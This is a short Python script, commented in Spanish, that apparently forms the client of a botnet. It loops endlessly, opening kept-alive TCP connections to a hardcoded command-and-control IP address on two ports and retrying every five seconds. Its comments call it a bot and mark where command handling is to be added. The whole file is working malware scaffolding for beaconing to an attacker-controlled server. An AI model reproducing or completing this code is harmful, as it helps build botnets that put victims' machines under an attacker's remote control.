import socket
import sys
import time

cnc_ips = ["64.131.92.138"]  # Reemplaza con la IP de tu servidor C&C
cports = [25761, 8443]  # Lista de puertos a los que el bot intentará conectarse

def main():
    while True:
        for cnc_ip in cnc_ips:
            for cport in cports:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                    s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
                    s.connect((cnc_ip, cport))
                    print(f"Connected to C&C server on {cnc_ip}:{cport}")
                    # Aquí puedes añadir la lógica para manejar la conexión y recibir comandos
                    break  # Salir del bucle si la conexión es exitosa
                except Exception as e:
                    print(f"Connection to {cnc_ip}:{cport} failed: {e}")
        time.sleep(5)  # Esperar 5 segundos antes de intentar reconectarse

if __name__ == '__main__':
    main()
